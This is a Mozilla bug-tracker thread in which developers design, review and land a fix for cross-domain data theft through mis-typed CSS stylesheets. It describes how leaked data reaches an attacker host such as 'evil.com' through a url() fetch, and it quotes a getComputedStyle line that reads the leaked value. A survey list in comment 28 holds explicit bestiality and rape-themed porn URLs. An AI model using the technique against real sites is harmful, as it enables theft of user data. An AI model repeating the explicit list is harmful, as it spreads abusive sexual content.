I'm not clear on how synchronous loads get triggered or what they're used for. Other things in this function imply that they are only for UA sheets, so we don't have to worry about cross-domain, but I'm not sure.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=524223#c19)• 15 years ago |
|  | |

(In reply to [comment #18](/show_bug.cgi?id=524223#c18 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> I'm not clear on how synchronous loads get triggered or what they're used for.
LoadSheetSync is a public nsICSSLoader API, so any C++ code that really wants to can use it...
Current consumers in mozilla-central (excluding tests) are:
\* nsChromeRegistry: should only happen for chrome:// URIs
\* nsHTMLEditor: should only happen for editor-provided URIs
\* nsLayoutStyleSheetCache: scrollbars.css, forms.css, ua.css, quirk.css,
userContent.css, useChrome.css
\* nsStyleSheetservice: extension-provided UA and user sheets
\* nsDocumentViewer: usechromesheets attribute on chrome <xul:browser/iframe>
\* nsXBLPrototypeResources: chrome:// URIs only.
\* nsXBLResourceLoader: chrome:// URIs only.
\* nsXMLContentSink: catalog sheets only (in practice, mathml.css)
\* nsDocument: catalog sheets
If LoadSheetSync ever gets a URI under control of untrusted content that's a serious bug, fwiw.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=524223#c20)• 15 years ago |
|  | |

Attached patch

[complete patch](attachment.cgi?id=412759&action=diff) (obsolete)
— [Details](attachment.cgi?id=412759&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=412759)

Here's a complete patch with the necessary parser changes and tests. I'm not sure I implemented exactly the same parsing semantics that cevans did for Webkit, but I doubt that the precise rules matter too much. If anyone can suggest a way to avoid adding 48 tiny little files to layout/style/tests I am all ears.
A remaining concern: does the error cleanup logic in SheetComplete() ensure that Javascript never sees the aborted sheet, or do we need to undo actions in the parser as well?
[Attachment #411763](/attachment.cgi?id=411763&action=edit "partial patch (CSSLoader changes only)") -
Attachment is obsolete: true
[Attachment #412759](/attachment.cgi?id=412759&action=edit "complete patch") -
Flags: superreview?(dbaron)
[Attachment #412759](/attachment.cgi?id=412759&action=edit "complete patch") -
Flags: review?(bzbarsky)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=524223#c21)• 15 years ago |
|  | |

Comment on [attachment 412759](/attachment.cgi?id=412759 "complete patch") [[details]](/attachment.cgi?id=412759&action=edit "complete patch") [[diff]](/attachment.cgi?id=412759&action=diff "complete patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=412759)
complete patch
I think I'd prefer s/raconian/raconianParsing/ throughout in variable and argument names.
>+++ b/layout/style/nsCSSParser.cpp
>+// Draconian error handling is a nonstandard mode used to close a
>+// data-theft loophole. A quirks mode document can declare any Web
>+// resource to be its style sheet; regardless of that resource's MIME
>+// type, we'll try to parse it as CSS. The normal CSS error recovery
>+// rules give the attacker a fairly decent chance of finding a valid
>+// style rule or two in there
Not sure how much of that comment we should leave in when we land if we're trying to not disclose this bug... I guess there's nothing there that describes the actual technique used here, but still please double-check with Chris?
> and the text of that rule then becomes
>+// accessible to the attacking document via the CSSOM.
As a matter of fact, no it does not. We enforce same-origin checks on CSSOM access. What the attack here does is to get parts of the data in the attacked document into a url() production, at which point the browser sends it to a server of the attacking document's choise as part of a GET.
>+ // XXX If draconian error handling triggered, should we undo all changes
>+ // to the style sheet? nsI[CSS]StyleSheet doesn't have methods for that...
We probably need to do that, yes. Add a method? It can throw if the sheet is complete, to make sure no one but us uses it.
As far as that goes, we might kick off @import loads before we hit a parse error. Do we want to abort them? They could in theory be communicating information to the server... But again, check with Chris? It sounds like his patch only aborts if the first rule it tries to parse doesn't parse; once it's parsed a rule it just follows normal CSS error-recovery. That would seem to be sufficient to me.
I didn't look at the tests very carefully.
> does the error cleanup logic in SheetComplete() ensure that Javascript never
> sees the aborted sheet
It does not, however in the cross-domain case JS can't access the sheet's rules directly anyway, per above.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=524223#c22)• 15 years ago |
|  | |

(In reply to [comment #21](/show_bug.cgi?id=524223#c21 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> (From update of [attachment 412759](/attachment.cgi?id=412759 "complete patch") [[details]](/attachment.cgi?id=412759&action=edit "complete patch") [[diff]](/attachment.cgi?id=412759&action=diff "complete patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=412759))
> I think I'd prefer s/raconian/raconianParsing/ throughout in variable and
> argument names.
Ok.
> >+++ b/layout/style/nsCSSParser.cpp
> >+// Draconian error handling is a nonstandard mode [...]
>
> Not sure how much of that comment we should leave in when we land if we're
> trying to not disclose this bug... I guess there's nothing there that
> describes the actual technique used here, but still please double-check
> with Chris?
Well, he's reading the bug... Chris?
> > and the text of that rule then becomes
> >+// accessible to the attacking document via the CSSOM.
>
> As a matter of fact, no it does not. We enforce same-origin checks on CSSOM
> access.
Huh, Chris said in the original description that it's a JS-based attack:
# The data is stolen cross domain with e.g.
# window.getComputedStyle(body\_element, null)
# .getPropertyValue('background-image');
# (This works in most browsers; for IE, you use
# ele.currentStyle.backgroundImage)
Maybe getComputedStyle is not a "CSSOM" access in the strict sense...?
> What the attack here does is to get parts of the data in the attacked
> document into a url() production, at which point the browser sends it to a
> server of the attacking document's choise as part of a GET.
The existing patch may not protect against that scenario, depending on when the GET fires. I \*think\* it never happens during parse, except maybe for @font-face, but I'm not sure that's a safe "except".
> >+ // XXX If draconian error handling triggered, should we undo all changes
> >+ // to the style sheet? nsI[CSS]StyleSheet doesn't have methods for that...
>
> We probably need to do that, yes. Add a method? It can throw if the sheet is
> complete, to make sure no one but us uses it.
It occurs to me that the only things that will get into the style sheet are from syntactically valid constructs preceding the first syntax error. It kinda sounded like Chris's proposal was for a weaker rule than the one I implemented: if the \*first\* construct in the document is ill-formed, bail out, otherwise do normal CSS error recovery. I could change it to be like that, and then we wouldn't need this additional sheet-rollback handling. But I'm not sure it's enough protection. Chris, what exactly did you make Webkit do? I'm not familiar enough with Webkit's CSS parser to tell from the patch.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=524223#c23)• 15 years ago |
|  | |

> Maybe getComputedStyle is not a "CSSOM" access in the strict sense...?
Ah, yeah. That's true. You can't access the rules directly, but you can observe their effect on the computed style...
> I \*think\* it never happens during parse
@import gets happen during parse. Or at least the channel's asyncOpen is called during parse. @font-face is not.
> It occurs to me that the only things that will get into the style sheet are
> from syntactically valid constructs preceding the first syntax error.
Yes.
> It kinda sounded like Chris's proposal was for a weaker rule
That's the impression I got too. Looking at the attached webkit patch, that seems to be exactly what's going on to me:
+ if (m\_styleSheet && !m\_hadSyntacticallyValidCSSRule)
+ m\_styleSheet->setHasSyntacticallyValidCSSHeader(false);
(in "invalid block hit") and then:
+ if (crossOriginCSS && !validMIMEType && !m\_sheet->hasSyntacticallyValidCSSHeader())
+ m\_sheet = CSSStyleSheet::create(this, url, charset);
(which replaces m\_sheet with a blank sheet). I'm not sure what sets m\_hadSyntacticallyValidCSSRule; that part seems to be autogenerated lexer code.

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=524223#c24)• 15 years ago |
|  | |

@Zack, #22: feel free to commit whatever comments you want. If news breaks out, then so be it. Co-oridating something like this across a million browser vendors (some of whom move at glacier speeds) is just too complicated.
@Boris, Zack #22 & #23: it's not necessarily a JS-based attack. My demo is JS-based because that is the easiest demo. However, imagine if getComputedStyle() did not exist. The attacker can still steal the same data because the background-image URL fetch will send the data in the GET request to evil.com.

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=524223#c25)• 15 years ago |
|  | |

On Mon, Nov 23, 2009 at 10:55 AM, Zack Weinberg <zweinberg@mozilla.com> wrote:
> I'm still a little confused about one nuance of the CSS cross-site data
> theft mitigation you proposed in Mozilla [bug 524223](/show_bug.cgi?id=524223 "RESOLVED FIXED - Cross-domain data theft using CSS"). Suppose that we
> load a cross-domain URI as a style sheet, it has the wrong MIME type,
> the \*first\* complete construct in the file is a valid CSS rule but
> there's a syntax error after that point. Should we still disregard the
> whole sheet? Or should we revert to regular CSS error handling if the
> first complete construct is well-formed?
The latter. The check is, in concept, a "header" check.
Also, we distinguish a syntax error from a sematic error (such as
unknown property). The latter should not be considered an error.

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=524223#c26)• 15 years ago |
|  | |

Comment on [attachment 412759](/attachment.cgi?id=412759 "complete patch") [[details]](/attachment.cgi?id=412759&action=edit "complete patch") [[diff]](/attachment.cgi?id=412759&action=diff "complete patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=412759)
complete patch
I've thought about this for a bit, and I've decided that I don't like the idea of having different behavior based on whether the first rule (or entirety) of a style sheet parses correctly.
The first reason that I think this is bad is that I think, in general, heuristics are bad platform. By heuristics, I mean complex mechanisms intended to devine intent out of existing content on the Web (such as what Opera does with media="handheld", or this). While they're fine at handling existing content (and that's what they're designed for), I think they're bad for two reasons: (1) they provide a bizarre API for future authors, who become unable to build a mental model of how the Web as a platform behaves, and (2) it makes it more complex for new entrants in the Web browser market, since they have to reverse-engineer these heuristics for compatibility with existing content.
Second, I don't like the implications of such a change for CSS error handling rules. CSS depends for future extensibility on the idea that new constructs added to the language will be skipped in well-defined ways. Taking this approach would break this and make Web authors much more hesitant to use future CSS language constructs as they are added, for fear of causing entire stylesheets to be ignored in older browsers that don't support those constructs.
So, on that basis, I'm denying superreview.
Instead, I think that we should take a slightly bigger short-term risk (for longer-term gain) and stop processing all cross-domain stylesheet loads with mismatched MIME types.
[Attachment #412759](/attachment.cgi?id=412759&action=edit "complete patch") -
Flags: superreview?(dbaron) → superreview-

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=524223#c27)• 15 years ago |
|  | |

(In reply to [comment #26](/show_bug.cgi?id=524223#c26 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Instead, I think that we should take a slightly bigger short-term risk (for
> longer-term gain) and stop processing all cross-domain stylesheet loads with
> mismatched MIME types.
I'm happy with this, and will add that I was not enthusiastic about being able to get the parser changes required for cevans' proposed rule into 3.6.x. Your somewhat more strict rule, on the other hand, is much easier to implement with the parser we've got (indeed, it requires no changes to nsCSSParser at all).
cevans: from that data set you crunched, how many sites were doing MIME-mislabeled, cross-domain loads of \*syntactically valid\* CSS?

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=524223#c28)• 15 years ago |
|  | |

I'll paste in the list of URLs. This list is for URLs I found that do cross-domain CSS loads with invalid MIME type. It's 83 URLs out of about 500,000. In the majority of cases, the CSS is syntactically valid. I think about 3 of those 83 returned syntactically \_in\_valid CSS in the form of CSS surrounded by <style> and a text/html MIME type.
Note that breaking all of these URLs would have consequences. For example, configure.dell.com is regrettably broken and uses the text/plain MIME type for cross-domain CSS in its "configure your PC" pages. That would be a significant breakage. Although presumably dell.com would fix it pretty damn pronto if their broken-yet-money-making site started failing to render in a browser as popular as Firefox.
Also beware that some of these URLs are porn URLs with pretty rough content. Well, I think that's clear from the text in the URLs themselves :-)
<http://ads.lfstmedia.com/fbslot/slot328>
<http://apps.facebook.com/eltabaco/index.php>
<http://apps.facebook.com/yoursay/>
<http://configure.dell.com/dellstore/config.aspx>
<http://configure.la.dell.com/dellstore/config.aspx>
<http://configure.la.dell.com/dellstore/poll.aspx>
<http://configure.us.dell.com/dellstore/DiscountDetails.aspx>
<http://configure.us.dell.com/dellstore/config.aspx>
<http://configure.us.dell.com/dellstore/print_summary_details_popup.aspx>
<http://date.bluesystem.ru/>
<http://date.bluesystem.ru/login.php>
<http://date.bluesystem.ru/members/>
<http://date.bluesystem.ru/members/who_viewed.php>
<http://date.bluesystem.ru/messages/>
<http://date.bluesystem.ru/messages/msgs.php>
<http://date.bluesystem.ru/photo/>
<http://date.bluesystem.ru/search.php>
<http://date.bluesystem.ru/view.php>
<http://date.bluesystem.ru/view_sex.php>
<http://forms.real.com/real/player/blackjack.html>
<http://forms.real.com/real/realone/realone.html>
<http://forum.derwesten.de/viewtopic.php>
<http://info.smmail.cn/jsp/service/LoginInterFace.jsp>
<http://jplanner.travelinenortheast.info/jpclient.exe>
<http://media.paran.com/entertainment/newslist.php>
<http://media.paran.com/entertainment/newsview.php>
<http://media.paran.com/sdiscuss/newshitlist.php>
<http://media.paran.com/sdiscuss/newsview2.php>
<http://media.paran.com/snews/newslist.php>
<http://media.paran.com/snews/newsview.php>
<http://month.gismeteo.ru/>
<http://month.gismeteo.ru/forecast.php>
<http://news.gismeteo.ru/news.n2>
<http://practiceexam.keys2drive.ca/quiz.php>
<http://search.chl.it/search.aspx>
<http://search.vampirefreaks.com/search_results.php>
<http://story.bluesystem.org/read.php>
<http://submit.123rf.com/submit/myuploaded.php>
<http://telefilmdb.blogspot.com/>
<http://www.aif.ru/>
<http://www.art.com/gallery/id--0/posters_p2.htm>
<http://www.baseball-reference.com/>
<http://www.baseball-reference.com/minors/player.cgi>
<http://www.baseball-reference.com/pl/player_search.cgi>
<http://www.edurang.net/uview/wrd/run/portal.show>
<http://www.fantatornei.com/calcio/fantalega/gestionelega.asp>
<http://www.google.es/ig/setp>
<http://www.homeportfolio.com/catalog/Listing.jhtml>
<http://www.pleshka.com/>
<http://www.smmail.cn/smmail/sy/index.html>
<http://www.tabelas.lancenet.com.br/Default.aspx>
<http://www.thongsdaily.com/>
<http://www.zootube365.com/>
<http://www.zootube365.com/animal-sex/1/>
<http://www.zootube365.com/animal-sex/horse-and-woman/1446/>
<http://www.zootube365.com/animal-sex/rochdale----does-her-pony/9740/>
<http://www.zootube365.com/animal-sex/woman-raped-by-pig-and-dog/2129/>
<http://www.zootube365.com/dog-sex/3/>
<http://www.zootube365.com/dog-sex/3/page/2/>
<http://www.zootube365.com/dog-sex/3/page/3/>
<http://www.zootube365.com/dog-sex/3/page/4/>
<http://www.zootube365.com/dog-sex/dog-cum00/11850/>
[http://www.zootube365.com/dog-sex/dog-\*\*\*\*-woman-firsttime/293/](http://www.zootube365.com/dog-sex/dog-%2A%2A%2A%2A-woman-firsttime/293/)
<http://www.zootube365.com/dog-sex/stuck-on-the-knot/1827/>
<http://www.zootube365.com/forum.html>
<http://www.zootube365.com/horse-sex/2/>
<http://www.zootube365.com/horse-sex/2/page/2/>
<http://www.zootube365.com/horse-sex/horse-try-woman-1/202/>
<http://www.zootube365.com/horse-sex/horsegirlcum/11487/>
<http://www.zootube365.com/horse-sex/linda-and-pony/191/>
<http://www.zootube365.com/latest.html>
<http://www.zootube365.com/latest/page/12/>
<http://www.zootube365.com/latest/page/13/>
<http://www.zootube365.com/latest/page/2/>
<http://www.zootube365.com/latest/page/4/>
<http://www.zootube365.com/latest/page/6/>
<http://www.zootube365.com/latest/page/7/>
<http://www.zootube365.com/login.html>
<http://www.zootube365.com/payment_start.html>
<http://www.zootube365.com/register.html>
<http://www.zootube365.com/search.html>
<http://www.zootube365.com/top.html>
<http://zootube365.com/>

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=524223#c29)• 15 years ago |
|  | |

What definition of "cross domain" was used for generating that list? Were the relevant dell.com stylesheets hosted on another subdomain of dell.com, or elsewhere?

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=524223#c30)• 15 years ago |
|  | |

"cross domain" as in the classic same origin policy case. i.e. a.dell.com != b.dell.com
(As an aside, I find all areas where the web model gives subtle extra privs between shared subdomains to be distasteful. Examples include the ability to interfere via setting domain cookies, and the "third party cookie" concept).
In the case of the dell.com site breakage, it appears that configure.dell.com is loading CSS from configure-cdn.dell.com as text/plain.
I don't have a full breakdown, but some of the example weren't a.blah.com vs. b.blah.com. I can't remember which ones, but some of the porn sites were loading CSS from a raw IP (?!) and I think it was application/octet-stream MIME type.
It is true that you likely could cover most (all?) of the cases with a combination of subdomain tricks plus maybe MIME type exemptions. You'd need to resample the above list. I don't have the data in the form "domain, CSS domain, MIME type" unfortunately.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a5006314_20209)• 15 years ago |

[Attachment #412759](/attachment.cgi?id=412759&action=edit "complete patch") -
Flags: review?(bzbarsky)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=524223#c31)• 15 years ago |
|  | |

Attached patch

[patch v2: quirks mode improper MIME type style loads must be same origin](attachment.cgi?id=418733&action=diff) (obsolete)
— [Details](attachment.cgi?id=418733&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418733)

This patch implements dbaron's more aggressive proposal of disallowing \*any\* cross-domain load with an improper MIME type.
It looks to me like the number of \*sites\* affected is quite small -- maybe only ten or so out of cevans' data set -- so that seems to me like we could reasonably punt to evangelism. How about we put this in 3.6.0 and see how loud the screaming is?
Note: I'm on vacation from Wednesday evening until the first week of January.
[Attachment #412759](/attachment.cgi?id=412759&action=edit "complete patch") -
Attachment is obsolete: true
[Attachment #418733](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") -
Flags: superreview?(dbaron)
[Attachment #418733](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") -
Flags: review?(bzbarsky)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=524223#c32)• 15 years ago |
|  | |

FYI to reviewers: There is reindentation in the patch, the actual lines of code changed in nsCSSLoader are very few. Also, I redid the test case to generate all the little CSS fragments we need out of an .sjs file rather than put them in CVS. There's still an awful lot of repetition in the test case proper (ccd-{quirks,standards}.html) but there's not much we can do about that.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=524223#c33)• 15 years ago |
|  | |

Attached patch

[whitespace-ignoring diff of nsCSSLoader.cpp](attachment.cgi?id=418737&action=diff) (obsolete)
— [Details](attachment.cgi?id=418737&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418737)

Here's a diff of nsCSSLoader.cpp ignoring the reindentation. (This is the only file with code changes.)

|  | [Daniel Holbert [:dholbert]](/user_profile?user_id=278074) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a5100987_278074)• 15 years ago |

[Attachment #418737](/attachment.cgi?id=418737&action=edit "whitespace-ignoring diff of nsCSSLoader.cpp") -
Attachment is patch: true

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=524223#c34)• 15 years ago |
|  | |

@Zack -- out of interest, what definition of "cross-domain" did you go with in the end (e.g. www.dell.com vs. configure.dell.com)?
I'd imagine people would be irritated if they couldn't customize Dell machine configurations any more.
On the other hand... congrats on FF3.5 becoming the single most popular browser out there! That's awesome, and gives leverage to request broken sites fix themselves. Doing the change more strictly is probably the right thing to do, and any e-commerce site is going to fix their broken MIME types pronto if it stops working well in FF.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=524223#c35)• 15 years ago |
|  | |

(In reply to [comment #34](/show_bug.cgi?id=524223#c34 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> @Zack -- out of interest, what definition of "cross-domain" did you go with in
> the end (e.g. www.dell.com vs. configure.dell.com)?
The strict one. Or, more accurately, the default one, which happens to be strict.
> I'd imagine people would be irritated if they couldn't customize Dell machine
> configurations any more.
I was thinking that we should at least contact the sites on your list and give them a heads-up before the patch lands. And this will need to be very clearly relnote-d. Which maybe means we need to backport it to 3.5 and 3.0 to avoid the "black hat uses our relnotes as a cookbook" thing.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=524223#c36)• 15 years ago |
|  | |

Comment on [attachment 418733](/attachment.cgi?id=418733 "patch v2: quirks mode improper MIME type style loads must be same origin") [[details]](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") [[diff]](/attachment.cgi?id=418733&action=diff "patch v2: quirks mode improper MIME type style loads must be same origin") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418733)
patch v2: quirks mode improper MIME type style loads must be same origin
r=bzbarsky, but as long as you're making the logging not suck how about:
LOG\_WARN((" Ignoring sheet with improper MIME type %s", contentType.get()));
?
[Attachment #418733](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") -
Flags: review?(bzbarsky) → review+

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=524223#c37)• 15 years ago |
|  | |

I remember thinking I should do that, but then I forgot to actually do it.
Changed in my copy.

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=524223#c38)• 15 years ago |
|  | |

Comment on [attachment 418733](/attachment.cgi?id=418733 "patch v2: quirks mode improper MIME type style loads must be same origin") [[details]](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") [[diff]](/attachment.cgi?id=418733&action=diff "patch v2: quirks mode improper MIME type style loads must be same origin") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418733)
patch v2: quirks mode improper MIME type style loads must be same origin
Did you check that the test for [bug 397427](/show_bug.cgi?id=397427 "RESOLVED FIXED - [FIX]Stylesheet href property shows redirected URL unlike other browsers") still fails if you locally revert that bug's fix? (And likewise for your own tests?)
sr=dbaron
[Attachment #418733](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") -
Flags: superreview?(dbaron) → superreview+

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=524223#c39)• 15 years ago |
|  | |

@Zack, #35: feel free to mention this in the release notes whenever 3.6 makes it out (and even if that happens before the 28th).

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=524223#c40)• 15 years ago |
|  | |

And, in particular, did you test that your test fails both for incorrect ignoring and for incorrect using of style sheets?

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=524223#c41)• 15 years ago |
|  | |

(In reply to [comment #39](/show_bug.cgi?id=524223#c39 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> @Zack, #35: feel free to mention this in the release notes whenever 3.6 makes
> it out (and even if that happens before the 28th).
This is unlikely to make 3.6.

|  | [Robert O'Callahan (:roc) (email my personal email if necessary)](/user_profile?user_id=5038) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=524223#c42)• 15 years ago |
|  | |

But we'll probably end up backporting this to some stable 3.6 release, \*after\* we've dealt with the site compatibility fallout.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=524223#c43)• 15 years ago |
|  | |

(In reply to [comment #38](/show_bug.cgi?id=524223#c38 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> (From update of [attachment 418733](/attachment.cgi?id=418733 "patch v2: quirks mode improper MIME type style loads must be same origin") [[details]](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") [[diff]](/attachment.cgi?id=418733&action=diff "patch v2: quirks mode improper MIME type style loads must be same origin") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418733))
> Did you check that the test for [bug 397427](/show_bug.cgi?id=397427 "RESOLVED FIXED - [FIX]Stylesheet href property shows redirected URL unlike other browsers") still fails if you locally revert
> that bug's fix? (And likewise for your own tests?)
I did not. Will try that first thing tomorrow.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=524223#c44)• 15 years ago |
|  | |

I didn't revert the entire patch for [bug 397247](/show_bug.cgi?id=397247 "RESOLVED WORKSFORME - tons of crashes in 2.0.0.7"), but I did change both calls to SetURIs() in nsCSSLoader to not pass the specially-calculated "original URL". This makes six of the 18 tests in test\_bug397247.html fail:
failed | href should be null - got "<http://localhost:8888/tests/layout/style/test/test_bug397427.html>", expected null
failed | should be actual null - got "string", expected "object"
passed | Redirect 1 did not work
passed | Redirect 1 did not get right base URI
passed | Redirect 2 did not work
passed | Redirect 2 did not get right base URI
passed | Redirect 3 did not work
passed | Redirect 3 did not get right base URI
failed | Unexpected href for imported sheet - got "<http://example.org/tests/layout/style/test/post-redirect-1.css>", expected "<http://localhost:8888/tests/layout/style/test/redirect.sjs?http://example.org/tests/layout/style/test/post-redirect-1.css>"
todo | Rule href should be absolute - got "redirect.sjs?<http://example.org/tests/layout/style/test/post-redirect-1.css>", expected "<http://localhost:8888/tests/layout/style/test/redirect.sjs?http://example.org/tests/layout/style/test/post-redirect-1.css>"
failed | Unexpected href for imported sheet - got "<http://example.org/tests/layout/style/test/post-redirect-2.css>", expected "<http://localhost:8888/tests/layout/style/test/redirect.sjs?http://example.org/tests/layout/style/test/post-redirect-2.css>"
todo | Rule href should be absolute - got "redirect.sjs?<http://example.org/tests/layout/style/test/post-redirect-2.css>", expected "<http://localhost:8888/tests/layout/style/test/redirect.sjs?http://example.org/tests/layout/style/test/post-redirect-2.css>"
passed | Unexpected href one
passed | Should have the same href when not redirecting
passed | Unexpected href two
failed | Should have the same href when redirecting - got "<http://localhost:8888/tests/layout/style/test/redirect.sjs?http://example.org/tests/layout/style/test/post-redirect-2.css>", expected "<http://example.org/tests/layout/style/test/post-redirect-2.css>"
passed | Unexpected href three
failed | Should have the same href when redirecting again - got "<http://localhost:8888/tests/layout/style/test/redirect.sjs?http://example.org/tests/layout/style/test/post-redirect-3.css>", expected "<http://example.org/tests/layout/style/test/post-redirect-3.css>"
I believe, by inspecting the test, that the 10 remaining successes are all controls -- that is, they should succeed regardless of whether [bug 397247](/show_bug.cgi?id=397247 "RESOLVED WORKSFORME - tons of crashes in 2.0.0.7") is fixed.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=524223#c45)• 15 years ago |
|  | |

(In reply to [comment #40](/show_bug.cgi?id=524223#c40 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> And, in particular, did you test that your test fails both for incorrect
> ignoring and for incorrect using of style sheets?
Yep. In the version I'm about to commit, there are two debugging modes present (but disabled) in ccd.sjs that can be used to verify this.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=524223#c46)• 15 years ago |
|  | |

Attached patch

[trunk patch as landed](attachment.cgi?id=419021&action=diff)
— [Details](attachment.cgi?id=419021&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=419021)

Differences from previous edition are Boris' suggested change to the logging, and the aforementioned debugging modes in ccd.sjs.
<http://hg.mozilla.org/mozilla-central/rev/b0cc8c093877>
[Attachment #418733](/attachment.cgi?id=418733&action=edit "patch v2: quirks mode improper MIME type style loads must be same origin") -
Attachment is obsolete: true
[Attachment #418737](/attachment.cgi?id=418737&action=edit "whitespace-ignoring diff of nsCSSLoader.cpp") -
Attachment is obsolete: true

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a5264965_34122)• 15 years ago |

Blocks: [536606](/show_bug.cgi?id=536606 "RESOLVED INCOMPLETE - Trunk now rejects cross-domain CSS loads with improper MIME type, even in quirks mode")

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=524223#c47)• 15 years ago |
|  | |

Filed follow-up [bug 536606](/show_bug.cgi?id=536606 "RESOLVED INCOMPLETE - Trunk now rejects cross-domain CSS loads with improper MIME type, even in quirks mode") for the evangelism, and [bug 536603](/show_bug.cgi?id=536603 "RESOLVED INACTIVE - Intermittent layout/style/test/test_css_cross_domain.html | quirks IB1l - got rgb(255, 0, 0), expected rgb(0, 255, 0)") for an intermittent failure in the test case which smells like an httpd.js issue. Also tagging for dev-docs -- this needs relnotes.
Release drivers: I think we need to give evangelism at least a month before this hits security updates; other than that, backport schedule is up to you.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a5265178_34122)• 15 years ago |

